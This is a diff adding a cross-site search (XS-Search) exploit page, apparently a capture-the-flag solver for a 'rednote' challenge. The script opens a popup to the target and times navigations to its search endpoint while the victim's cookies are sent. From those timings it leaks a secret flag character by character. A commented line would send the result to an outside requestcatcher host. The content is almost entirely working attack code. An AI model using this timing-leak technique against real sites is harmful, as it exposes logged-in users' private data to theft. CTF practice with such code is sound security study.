@@ -1,0 +1,93 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>rednote XS-Search solver</title>
+<pre id=log>starting…</pre>
+<script>
+/* ===== CONFIG ===== */
+const ORIGIN = "http://rednote:1337";
+const SEARCH_PATH = "/search?query=";
+// Flag charset from hint in the challenge: SEKAI{[a-z_]+}
+const CHARSET = "abcdefghijklmnopqrstuvwxyz_";
+const PREFIX = "SEKAI{";
+const SUFFIX = "}";
+// Rate-limit friendly pacing (4 per 4s == 1/sec); keep a small buffer:
+const SLEEP_MS = 1100;
+
+/* ===== helpers ===== */
+const log = (...a)=> document.getElementById('log').textContent += a.join(' ') + "\n";
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function openVictimWindow() {
+  const w = window.open("about:blank", "victim", "width=900,height=700");
+  if (!w) throw new Error("Popup blocked");
+  return w;
+}
+
+async function timeNav(win, url) {
+  return await new Promise((resolve) => {
+    const start = performance.now();
+    // attach onload before navigation (works cross-origin)
+    win.onload = () => resolve(performance.now() - start);
+    // navigate (top-level => SameSite=Lax cookie is sent)
+    win.location = url + (url.includes("?") ? "&" : "?") + "_t=" + Math.random();
+  });
+}
+
+/* Calibrate which side is slower/faster: a “hit” (flag substring present) vs “miss”. */
+async function calibrate(win) {
+  // A likely HIT: just the known prefix "SEKAI{"
+  const tHit = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(PREFIX));
+  await sleep(SLEEP_MS);
+  // A guaranteed MISS
+  const tMiss = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent("__definitely_not_in_flag__"));
+  await sleep(SLEEP_MS);
+
+  log(`calibration → HIT=${tHit.toFixed(1)}ms, MISS=${tMiss.toFixed(1)}ms`);
+  // If note page is heavier, HIT will usually be slower. Flip comparator if needed.
+  const hitIf = (t) => (tHit > tMiss) ? (t > (tHit + tMiss)/2) : (t < (tHit + tMiss)/2);
+  return hitIf;
+}
+
+async function solve() {
+  const win = openVictimWindow();
+  log("popup opened; starting…");
+
+  const isHit = await calibrate(win);
+
+  let flag = PREFIX;
+  outer: for (let i = 0; i < 64; i++) {
+    let found = null, bestT = Infinity, rec = [];
+
+    for (const ch of CHARSET) {
+      const q = flag + ch;
+      const t = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(q));
+      rec.push([ch, t]);
+      await sleep(SLEEP_MS);
+
+      // pick the char whose timing looks like the calibrated “HIT”
+      if (isHit(t)) {
+        found = ch;
+        bestT = t;
+        break;
+      }
+    }
+
+    if (!found) {
+      // As a fallback (noise), pick the fastest one
+      rec.sort((a,b)=>a[1]-b[1]);
+      found = rec[0][0];
+      bestT = rec[0][1];
+    }
+
+    flag += found;
+    log(`→ ${flag}  (picked '${found}' @ ${bestT.toFixed(1)}ms)`);
+    if (found === "}" || flag.endsWith(SUFFIX)) break outer;
+  }
+
+  log("\nFINAL:", flag);
+  // send to your catcher if desired:
+  // navigator.sendBeacon("https://en0phinx.requestcatcher.com/flag", flag);
+}
+
+solve().catch(e => log("error:", e));
+</script>
